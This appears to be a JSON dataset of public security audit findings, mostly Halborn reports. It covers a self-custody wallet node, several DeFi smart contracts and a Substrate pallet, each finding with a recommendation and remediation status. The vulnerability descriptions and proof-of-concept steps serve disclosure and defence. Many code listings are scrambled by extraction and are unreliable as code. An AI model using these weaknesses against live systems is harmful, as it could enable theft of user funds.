parameter. Relying on addr just to interact with a wallet object and retrieve the private key for that wallet is not enough, as it does not provide an authentication layer for wallets. Multiple critical functions were found for this issue, such as wallet_web3_sign and wallet_web3_interaction. Risk Level: Likelihood - 5 Impact - 5 Recommendation: Only privileged accounts (Admin) should be able to interact with wallets for privileged operations. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the OTP Password in critical functions. 815fc73bc5f0dac4c7cb2544bcd249f45aa08135 14 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Critical"]}, {"title": "CRYPTOGRAPHY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "The Self-Custody, stores the wallet related data and private keys within a database, however, it was observed that the wallet password was stored in a plain text format without any hashing or encryption, meanwhile, the response scheme was observed to return the password in the HTTP response. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the password from the HTTP response and not store the wallet password in plain text within the database and use that password as a second verification or authentication method within wallet related operations. Remediation Plan: ACKNOWLEDGED: The Playground Labs team acknowledged this finding and the severity has been changed to informational. 15 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Informational"]}, {"title": "ARCHITECTURE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "The Self-Custody, authentication system and API implementation in general were found to lack the rate limit mechanism, which in turn exposes the Self-Custody, to brute force and denial of service attacks at the level of the application logic. Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to implement a rate limit mechanism and user lockout policy to defend against brute force attacks. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding an application level rate limit. de794da9109a1f9fe8c1cdf74c9dba9511148834 16 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Medium"]}, {"title": "API", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "A user enumeration vulnerability was observed within the login endpoint, a malicious actor can brute force valid usernames to find valid users on the system and use them in other attack scenarios. Recommendation: It is recommended to remove any response from the login process indicating that the user is valid or invalid and return a generic error message such as invalid username or password.. Remediation Plan: SOLVED: 815fc73bc5f0dac4c7cb2544bcd249f45aa08135 Playground Labs team The solved the issue in commit 17 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Medium"]}, {"title": "LOG MANAGEMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "The HTTP Server within Self-Custody, was observed to be logging HTTP requests at an early stage with the HTTP body. The attacker can fill the disk with logs simply by sending simple HTTP requests with large chunks of data within the request body to the Custody HTTP Server. Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to log the request body only when debugging is enabled. Remediation Plan: SOLVED: fd692d0763b9696c24f036abbb25ec6c78dabb89 Playground Labs team The solved the issue in commit 18 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Low"]}, {"title": "ARCHITECTURE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "During the user creation process, it was observed that a weak password policy was applied during the creation of the users password hash, as it is only checks if the password is longer than 8 characters, which is not enough as a password strength baseline. Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to enforce a stricter password policy that ensures that the users password contains uppercase, lowercase, non-alphanumeric characters, and is longer than 8 characters. Remediation Plan: SOLVED: 3f325accdbc5824f147a986f35606ef049224e2f Playground Labs team The solved the issue in commit 19 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Low"]}, {"title": "ARCHITECTURE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "It was noted that the authentication system within the Self-Custody, lacks a two-factor authentication mechanism. In case of credentials theft, the attacker can perform privileged operations such as transactions and interact with other critical functions. Risk Level: Likelihood - 3 Impact - 2 Recommendation: Two-factor authentication is recommended to reduce the impact of creden- tial theft attacks. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the OTP Password in critical functions. ebda4a69fee55bf67501eede7777a5d06fc77a4a 20 3.10 (HAL-10) HTTP - MISCONFIGURED CORS - LOW ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Low"]}, {"title": "IGNORE EXTERNAL CALL FEE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The wormhole publishMessage function is payable. Currently, requires no fees, but that can be changed over time. If the wormhole decides to set a fee greater than 0, all those external calls within the protocol would fail. Hence, leaving the wormhole routers unable to perform their critical tasks. Code Location: Listing 1: L2WormholeRouter.sol (Line 33) require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . 29 function reportTransferredFund ( uint256 amount ) external { 30 31  L2_FUND_TRANSFER_REPORT , amount ); 32 33  consistencyLevel ); 34 } 35 uint64 sequence = wormhole . nextSequence ( address ( this )) ; wormhole . publishMessage ( uint32 ( sequence ) , payload , Listing 2: L2WormholeRouter.sol (Line 40) require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . L2_FUND_REQUEST , 36 function requestFunds ( uint256 amount ) external { 37 38  amount ); 39 40  consistencyLevel ); 41 } 42 uint64 sequence = wormhole . nextSequence ( address ( this )) ; wormhole . publishMessage ( uint32 ( sequence ) , payload , 15 Listing 3: L1WormholeRouter.sol (Line 37) // NOTE : We use the current tx count ( to wormhole ) of this // as a nonce when publishing messages // This casting is fine so long as we send less than 2 ** 32 - require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . L1_TVL , tvl , 29 function reportTVL ( uint256 tvl , bool received ) external { 30 31  received ); 32  contract 33 34  1 (~ 4 billion ) messages 35 36 37  consistencyLevel ); 38 } 39 uint64 sequence = wormhole . nextSequence ( address ( this )) ; wormhole . publishMessage ( uint32 ( sequence ) , payload , Listing 4: L1WormholeRouter.sol (Line 45) uint64 sequence = wormhole . nextSequence ( address ( this )) ; require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . 40 function reportTransferredFund ( uint256 amount ) external { 41 42  L1_FUND_TRANSFER_REPORT , amount ); 43 44 45  consistencyLevel ); 46 } 47 wormhole . publishMessage ( uint32 ( sequence ) , payload , Proof of Concept: 1. Wormhole publishMessage function increase its fee transaction 2. Affine DeFi wormhole routers fail to publish messages due to not sending any fee on the transaction 3. Affine DeFi overall protocol does not properly work 16 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Considering the need to call publishMessage, paying transaction fees is strongly recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 17 ", "labels": ["Halborn", "Affine_DeFi_Multiplyr", "Severity: Medium"]}, {"title": "POSSIBLE LOSS OF FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Wormhole does not fail if the destination chain ID is different from the one supposed to be. If the rebalancer bot calls this function directly with a different chain ID, it will not fail, so funds during the transactions can be lost. You can check the Wormhole Chain IDs on each chain, which is not the same as the network chain ID and can be easily confused. Code Location: Listing 5: WormholeRouter.sol (Line 43) require ( vm . emitterAddress == bytes32 ( uint256 ( uint160 ( 41 function _validateWormholeMessageEmitter ( IWormhole . VM memory vm )  internal view { 42  otherLayerRouter ))) , \" Wrong emitter address \"); 43  chain \"); 44 45 } 46 require ( vm . nonce >= nextValidNonce , \" Old transaction \" ); require ( vm . emitterChainId == otherLayerChainId , \" Wrong emitter Proof of Concept: 1. Confuse wormhole chain ID with network chain ID 2. Initialize the contract with a wrong wormhole chain ID 3. Execute transactions on the protocol 4. Validate wormhole message emitter does not work as intended 18 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Creating a Chain ID whitelist with all the possible Chain IDs or having it hardcoded within the contract is recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 19 ", "labels": ["Halborn", "Affine_DeFi_Multiplyr", "Severity: Medium"]}, {"title": "POSSIBLE UNPREDICTABILITY BETWEEN L2 AND L1 RATIOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When setLayerRatios function is used to update the ratio between L1 and Hence, the L2, an invalid total ratio can be set (more than 100%). rebalancer bot could not properly work in those cases. Code Location: Listing 6: L2Vault.sol (Lines 450,451) 449 function setLayerRatios ( uint256 _l1Ratio , uint256 _l2Ratio )  external onlyGovernance { l1Ratio = _l1Ratio ; l2Ratio = _l2Ratio ; 450 451 452 } 453 Risk Level: Likelihood - 2 Impact - 3 Recommendation: When setting the ratios, making sure the total ratio is equal to 100% is recommended. Remediation Plan: RISK ACCEPTED: The Affine DeFi team accepted the risk of this finding. 20 ", "labels": ["Halborn", "Affine_DeFi_Multiplyr", "Severity: Low"]}, {"title": "FUNCTION DOES NOT CHECK THE TOKEN BALANCE BEFORE AND AFTER A CALL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Whenever the exit function is used, the contract should check the token balance before and after the call. So, the exact amount of tokens sent can be properly checked. Code Location: Listing 7: BridgeEscrow.sol (Line 64) require ( msg . sender == wormholeRouter , \" Only wormhole router \"); // Exit tokens , after that the withdrawn tokens from L2 will rootChainManager . exit ( exitProof ); 60 function l1ClearFund ( uint256 amount , bytes calldata exitProof )  external { 61 62 63  be reflected in L1 BridgeEscrow . 64 65 66 67 68 69 70 71 72 73 74 } 75 // Transfer exited tokens to L1 Vault . uint256 balance = token . balanceOf ( address ( this )) ; require ( balance >= amount , \" Funds not received \" ); IL1Vault l1Vault = IL1Vault ( vault ); token . safeTransfer ( address ( l1Vault ) , balance ); l1Vault . afterReceive () ; Risk Level: Likelihood - 2 Impact - 2 21 Recommendation: Checking the token balance before and after the exit call is recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 22 ", "labels": ["Halborn", "Affine_DeFi_Multiplyr", "Severity: Low"]}, {"title": "LACK OF PROPER SLIPPAGE PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Within the _claimAndSellRewards function, the slippage protection of the transaction is set to zero. Hence, if there is tiny liquidity, there is a high risk of losing part of the investment. Code Location: Listing 8: L1CompoundStrategy.sol (Line 127) uint256 rewardTokenBalance = balanceOfRewardToken () ; if ( rewardTokenBalance >= minRewardToSell ) { _sellRewardTokenForWant ( rewardTokenBalance , 0) ; comptroller . claimComp ( address ( this )) ; if ( rewardToken != address ( cToken )) { 122 function _claimAndSellRewards () internal { 123 124 125 126 127 128 129 130 131 } 132 } return ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Setting at least 5% slippage protection is recommended. 23 Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 24 ", "labels": ["Halborn", "Affine_DeFi_Multiplyr", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF CHAIN ID", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When initializing the wormhole router, the wormhole chain ID can be misused. As can be wrongly set due to confusion with the different deployed chain IDs. As mentioned on HAL02, you can check the Wormhole Chain IDs on each chain, which is not the same as the network chain ID and can be easily confused. Code Location: Listing 9: L2WormholeRouter.sol (Line 26) external initializer 18 function initialize ( IWormhole _wormhole , L2Vault _vault , address  _otherLayerRouter , uint16 _otherLayerChainId ) 19 20 21 { 22 23 24 25 26 27 } 28 wormhole = _wormhole ; vault = _vault ; governance = vault . governance () ; otherLayerRouter = _otherLayerRouter ; otherLayerChainId = _otherLayerChainId ; Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: As mentioned on HAL02, creating a Chain ID whitelist with all the possible Chain IDs or having it hardcoded within the contract is recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 26 ", "labels": ["Halborn", "Affine_DeFi_Multiplyr", "Severity: Informational"]}, {"title": "SAME PAIR OF TOKENS CAN BE USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "It is observed that in forward() and swapAndSend() functions inside ReceivingForwarder.sol and in CrosschainForwarder.sol does not check if source token type equals to destination token type and accepts same pair of tokens as input. This type of bugs may lead to critical attack vectors or griefing attacks. Code Location: ReceivingForwarder.sol  forward Listing 1: ReceivingForwarder.sol (Lines 30,33) 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 function forward ( address _dstTokenIn , address _router , bytes memory _routerCalldata , address _dstTokenOut , address _fallbackAddress ) external payable override { if ( _dstTokenIn == NATIVE_TOKEN ) { return _forwardFromETH ( _router , _routerCalldata , _dstTokenOut , _fallbackAddress ); } else { return _forwardFromERC20 ( IERC20Upgradeable ( _dstTokenIn ) , _router , 13 48 49 50 51 _routerCalldata , _dstTokenOut , _fallbackAddress ); CrosschainForwarder.sol  swapAndSend Listing 2: LPConnector.sol (Lines 47,52) function swapAndSend ( address _srcTokenIn , uint _srcAmountIn , bytes memory _srcTokenInPermit , address _srcSwapRouter , bytes calldata _srcSwapCalldata , address _srcTokenOut , bytes calldata _dstDetails ) external payable override { if (! supportedRouters [ _srcSwapRouter ]) revert uint ethBalanceBefore = address ( this ). balance - msg . value ; uint srcAmountOut ; if ( _srcTokenIn == NATIVE_TOKEN ) { _validateSrcETHIn ( _srcAmountIn ); srcAmountOut = _swapToERC20Via ( _srcSwapRouter , _srcSwapCalldata , _srcAmountIn , IERC20Upgradeable ( _srcTokenOut ) 46 47 48 49 50 51 52 53 54 55  NotSupportedRouter () ; 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 } else { ... ); 14 Proof of Concept: In the Proof of Concept below, we created a test script which gives same input token type for source and destination. Listing 3: Proof of concept it ( ' Same pair of tokens ' , async () = > { await state . usdToken . instance . mint ( state . user . address , usd2v console . log ( await state . usdToken . instance . balanceOf ( state . await state . receivingForwarder . instance . connect ( state . user ) state . usdToken . instance . address , // _wrappedToken state . dex . instance . address , // _router SAMPLE_CALLDATA . swap . sample , // _routerCalldata state . usdToken . instance . address , // _targetToken state . user . address , // _fallbackAddress console . log ( await state . usdToken . instance . balanceOf ( state . . forward ( 1 2  (10) ); 3  user . address )); 4 5 6 7 8 9 10 11 12 13 14  user . address )); }) ; 15 ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to ensure that source and destination tokens are not of the same type. 15 Remediation Plan: NOT APPLICABLE: The issue is marked as not applicable by the DeBridge team with an explanation: Both CrosschainForwarder and ReceivingForwarder work as relayers: they take tokenIn from msg.sender, swap it to tokenOut via the swapRouter, then pass the resulting tokenOut along with deBridgeGate or the destination address. It seems that there is nothing wrong with the situation when both tokens are the same. Moreover, this opens broad possibilities for arbitrage. 16 ", "labels": ["Halborn", "deBridge_Cross_Chain_Swap", "Severity: Informational"]}, {"title": "MISSING PAUSEABLE FUNCTIONALITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "Even code that has been thoroughly audited and tested may contain bugs or defective code parts. These flaws are frequently undetected until they are employed in an attack by an opponent. Because immutability is one of the basic characteristics of the blockchain, it is difficult to correct if a critical fault is discovered. While some patterns (such as the Proxy Delegate pattern) allow for upgradeable code to some extent, these solutions normally take a long time to implement and come into action. Before the update is transmitted to the network, the attackers could continue with their malicious actions and cause harm. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add an option to disable critical contract func- tionality in case of an emergency. Remediation Plan: NOT APPLICABLE: The issue is marked as not applicable by the DeBridge team with an explanation: ReceivingForwarder and CrosschainForwarder communicate with the deBridgeGate contract. If we ever need to stop the contracts, we can either stop deBridgeGate or quickly upgrade the proxy to a fixed or paused implementation. 17 ", "labels": ["Halborn", "deBridge_Cross_Chain_Swap", "Severity: Informational"]}, {"title": "UNUSED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The return value of an external call is not stored in a local or state vari- able. In CrosschainForwarder.sol, LPConnector.sol and ReceivingForwarder .sol contracts, there are few instances where external methods are being called using approve and return values(bool) are being ignored. Code Location: CrosschainForwarder.sol  swapAndSend Listing 4: CrosschainForwarder.sol 74 srcTokenIn . approve ( _srcSwapRouter , srcAmountOut ); Listing 5: CrosschainForwarder.sol 82 srcTokenIn . approve ( _srcSwapRouter , srcAmountOut );  _sendToBridge Listing 6: CrosschainForwarder.sol 215 IERC20Upgradeable ( token ). approve ( address ( deBridgeGate ) , 0) ; LPConnector.sol  swapFrom 18 Listing 7: LPConnector.sol 77 _tokenIn . approve ( target . pool , _amountIn ); Listing 8: LPConnector.sol 86 _tokenIn . approve ( target . router , _amountIn ); Listing 9: LPConnector.sol 98 _tokenIn . approve ( target . pool , 0) ; ReceivingForwarder.sol  _forwardFromERC20 Listing 10: ReceivingForwarder.sol 97 dstTokenIn . approve ( _router , dstTokenInAmount ); Listing 11: ReceivingForwarder.sol 109 dstTokenIn . approve ( _router , 0) ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add return value checks to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 19 Remediation Plan: PENDING: The issue was acknowledged by the DeBridge team and will be fixed later. 20 ", "labels": ["Halborn", "deBridge_Cross_Chain_Swap", "Severity: Informational"]}, {"title": "COGNITIVE COMPLEXITY OF FUNCTION IS TOO HIGH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be difficult to maintain. CrossChainPathFindingService.ts - refreshDst Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to refactor this function to reduce its cognitive complexity by separating it to different functions. Remediation Plan: ACKNOWLEDGED: The DeBridge team acknowledged this finding. 21 ", "labels": ["Halborn", "deBridge_Cross_Chain_Swap", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Furthermore, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Code Location: LPConnector.sol - getUnwrapToken Listing 12: LPConnector.sol function getUnwrapToken ( address _wrappedToken ) public view 51  returns ( address ) { 52 53 } return pools [ _wrappedToken ]. jToken ; Risk Level: Likelihood - 1 Impact - 1 22 Recommendation: It is recommended to mark this function as external, if it will not be called inside the contract. Remediation Plan: SOLVED: The issue was solved by the DeBridge team.  Fix Commit 23 3.6 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "deBridge_Cross_Chain_Swap", "Severity: Informational"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "The following crates used in the avail have known vulnerabilities: RUSTSEC-2021-0130 RUSTSEC-2020-0071 lru 0.6.6 time 0.1.44 Use after free in lru crate Potential segfault in the time crate Risk Level: Likelihood - 1 Impact - 3 Recommendation: RUSTSEC-2021-0130 RUSTSEC-2020-0071 lru 0.6.6 time 0.1.44 Upgrade to >=0.7.1 Upgrade to >=0.2.23 Even if those vulnerable crates cannot affect the underlying application, it is advised to be aware of them. Furthermore, you need to set up dependency monitoring to always be alerted when a new vulnerability is disclosed in one of the project crates. Remediation plan: PENDING: The issue will be addressed in the future with an upstream update. 13 ", "labels": ["Halborn", "Polygon_Avail_Substrate_Pallet", "Severity: Low"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "The documentation describes an RPC method get_blockConfidence which is not implemented in the code. This can be confirmed by querying the node RPC endpoint at http://127.0.0.1:9933 Code Location: Listing 1 {\" jsonrpc \" : \" 2.0 \" ,\" result \" :{ \" methods \" :[ \" account_nextIndex \" ,\" curl -H \" Content - Type : application / json \" -d ' {\" id \":1 , \" jsonrpc 1  \":\"2.0\" , \" method \": \" rpc_methods \"} ' http :// localhost :9933/ 2 3  author_hasKey \" ,\" author_hasSessionKeys \" ,\" author_insertKey \" ,\"  author_pendingExtrinsics \" ,\" author_removeExtrinsic \" ,\"  author_rotateKeys \" ,\" author_submitAndWatchExtrinsic \" ,\"  author_submitExtrinsic \" ,\" author_unwatchExtrinsic \" ,\"  babe_epochAuthorship \" ,\" chain_getBlock \" ,\" chain_getBlockHash \" ,\"  chain_getFinalisedHead \" ,\" chain_getFinalizedHead \" ,\" chain_getHead \" ,\"  chain_getHeader \" ,\" chain_getRuntimeVersion \" ,\"  chain_subscribeAllHeads \" ,\" chain_subscribeFinalisedHeads \" ,\"  chain_subscribeFinalizedHeads \" ,\" chain_subscribeNewHead \" ,\"  chain_subscribeNewHeads \" ,\" chain_subscribeRuntimeVersion \" ,\"  chain_unsubscribeAllHeads \" ,\" chain_unsubscribeFinalisedHeads \" ,\"  chain_unsubscribeFinalizedHeads \" ,\" chain_unsubscribeNewHead \" ,\"  chain_unsubscribeNewHeads \" ,\" chain_unsubscribeRuntimeVersion \" ,\"  childstate_getKeys \" ,\" childstate_getKeysPaged \" ,\"  childstate_getKeysPagedAt \" ,\" childstate_getStorage \" ,\"  childstate_getStorageEntries \" ,\" childstate_getStorageHash \" ,\"  childstate_getStorageSize \" ,\" grandpa_proveFinality \" ,\"  grandpa_roundState \" ,\" grandpa_subscribeJustifications \" ,\"  grandpa_unsubscribeJustifications \" ,\" kate_blockLength \" ,\"  kate_queryProof \" ,\" mmr_generateProof \" ,\" offchain_localStorageGet \" ,\"  offchain_localStorageSet \" ,\" payment_queryFeeDetails \" ,\"  payment_queryInfo \" ,\" state_call \" ,\" state_callAt \" ,\"  state_getChildReadProof \" ,\" state_getKeys \" ,\" state_getKeysPaged \" ,\"  state_getKeysPagedAt \" ,\" state_getMetadata \" ,\" state_getPairs \" ,\" 14  state_getReadProof \" ,\" state_getRuntimeVersion \" ,\" state_getStorage \" ,\"  state_getStorageAt \" ,\" state_getStorageHash \" ,\" state_getStorageHashAt  \" ,\" state_getStorageSize \" ,\" state_getStorageSizeAt \" ,\"  state_queryStorage \" ,\" state_queryStorageAt \" ,\"  state_subscribeRuntimeVersion \" ,\" state_subscribeStorage \" ,\"  state_traceBlock \" ,\" state_unsubscribeRuntimeVersion \" ,\"  state_unsubscribeStorage \" ,\" subscribe_newHead \" ,\"  sync_state_genSyncSpec \" ,\" system_accountNextIndex \" ,\"  system_addLogFilter \" ,\" system_addReservedPeer \" ,\" system_chain \" ,\"  system_chainType \" ,\" system_dryRun \" ,\" system_dryRunAt \" ,\" system_health  \" ,\" system_localListenAddresses \" ,\" system_localPeerId \" ,\" system_name \"  ,\" system_nodeRoles \" ,\" system_peers \" ,\" system_properties \" ,\"  system_removeReservedPeer \" ,\" system_reservedPeers \" ,\"  system_resetLogFilter \" ,\" system_syncState \" ,\"  system_unstable_networkState \" ,\" system_version \" ,\"  unsubscribe_newHead \" ], \" version \" :1} , \" id \" :1} 4 Recommendation: it is recommended to review the code and documentation to correct the state of one another. References:  https://avail-docs.matic.today/docs/intro/#how-to-get-guarantees- that-the-data-behind-the-transaction-is-available Remediation plan: SOLVED: This issue was fixed by updating the docs. 15 ", "labels": ["Halborn", "Polygon_Avail_Substrate_Pallet", "Severity: Informational"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "It was noticed that Avail solution does not implement any custom origin. Custom origins can be used as authorization checks inside privileged functions, as well as to define custom access-control logic. Code Location: Listing 2: pallets/dactr/src/lib.rs (Line 145) 140 141 142 143 144 145 146 147 148 pub fn submit_block_length_proposal ( origin : OriginFor <T >, rows : u32 , cols : u32 , ) -> DispatchResultWithPostInfo { ensure_root ( origin ) ?; ensure! ( rows <= T :: MaxBlockRows :: get () && cols <= T ::  MaxBlockCols :: get () , 149 150 151 152 Error :: <T >:: BlockDimensionsOutOfBounds ); ensure! ( rows >= T :: MinBlockRows :: get () && cols >= T ::  MinBlockCols :: get () , 153 154 155 156 157 158 Error :: <T >:: BlockDimensionsTooSmall ); let _id = Self :: next_block_len_proposal_id () ?; let block_length = BlockLength :: with_normal_ratio ( rows , cols ,  BLOCK_CHUNK_SIZE , NORMAL_DISPATCH_RATIO ); 159 160 161 DynamicBlockLength :: <T >:: put (& block_length ); Self :: deposit_event ( Event ::  BlockLengthProposalSubmitted { rows , cols }) ; 162 163 Ok (() . into () ) 16 164 } Recommendation: It is recommended to implement at least one custom origin mapped to col- lective/governance, so implementation of potential access-control logic is much easier if project is developed further and grows in codebase/u- tilities in the future. Remediation plan: ACKNOWLEDGED: The issue was acknowledged by the Polygon team. It could be addressed in later versions. The Polygon team is aware of the custom logic implementation and it could be implemented in future releases when the project actually uses governance or any other similar pallets. 17 ", "labels": ["Halborn", "Polygon_Avail_Substrate_Pallet", "Severity: Informational"]}, {"title": "HAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf", "body": "The avail does not have mechanism to remove unused App_Id. This could lead to unnecessary storage usage. Furthermore, App_Id is uint32 and has a limited size, which means it could cause denial of the service if it reaches maximum value. Code Location: Listing 3: pallets/dactr/src/lib.rs 1 cat lib . rs | grep \" pub fn \" 2 pub fn create_application_key ( 3 pub fn submit_data ( 4 pub fn submit_block_length_proposal ( 5 pub fn build_storage (& self ) -> Result < sp_runtime :: Storage , String >  { 6 pub fn assimilate_storage (& self , storage : & mut sp_runtime :: Storage  ) -> Result <() , String > { 7 pub fn next_application_id () -> Result < AppId , Error <T >> { 8 pub fn next_block_len_proposal_id () -> Result < T ::  BlockLenProposalId , Error <T >> { Recommendation: Implement logic that will either enable to remove unused App Ids via consensus or clear them automatically after certain period of inactivity. Remediation plan: ACKNOWLEDGED: The issue was acknowledged by the Polygon team. It could be addressed with in later versions. Redesigning the app_id logic currently 18 could introduce more potential threats, while at this point the security impact is very limited. 19 ", "labels": ["Halborn", "Polygon_Avail_Substrate_Pallet", "Severity: Informational"]}, {"title": "PRECISION LOSS IN PARTIALLYCLOSEPOSITION FUNCTION WILL BLOCK THE LAST USER FROM CLOSING THE POSITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The partiallyClosePositionViaSignature() function call has the following flow: 1. TradeManagerOrders.partiallyClosePositionViaSignature() 2. TradeManagerOrders._partiallyClosePosition() 3. TradePair.partiallyClosePosition() 4. TradePair._partiallyClosePosition() 5. PositionMaths.partiallyClose() Listing 1: PositionMaths.sol (Lines 438,452,453,454) 419 /* * 420 421 422 * @dev Partially closing works as follows : * * 1. Sell a share of the position , and use the proceeds to either  : * 2. a ) Get a payout and by this , leave the leverage as it is * 2. b ) \" Buy \" new margin and by this decrease the leverage * 2. c ) a mixture of 2. a) and 2. b) */ 423 424 425 426 427 function _partiallyClose ( Position storage self , int256  currentPrice , uint256 closeProportion ) 428 429 430 { 431 432 433 internal returns ( int256 ) require ( closeProportion < PERCENTAGE_MULTIPLIER , \" PositionMaths :: _partiallyClose : cannot partially close  full position \" ); 434 435 18 436 437 438 Position memory delta ; // Close a proportional share of the position delta . margin = self . _lastNetMargin () * closeProportion /  PERCENTAGE_MULTIPLIER ; 439 delta . volume = self . volume * closeProportion /  PERCENTAGE_MULTIPLIER ; 440 delta . assetAmount = self . assetAmount * closeProportion /  PERCENTAGE_MULTIPLIER ; 441 442 // The realized PnL is the change in volume minus the price of  the changes in size at LONG 443 444 // And the inverse of that at SHORT // @dev At a long position , the delta of size is sold to give  back the volume 445 // @dev At a 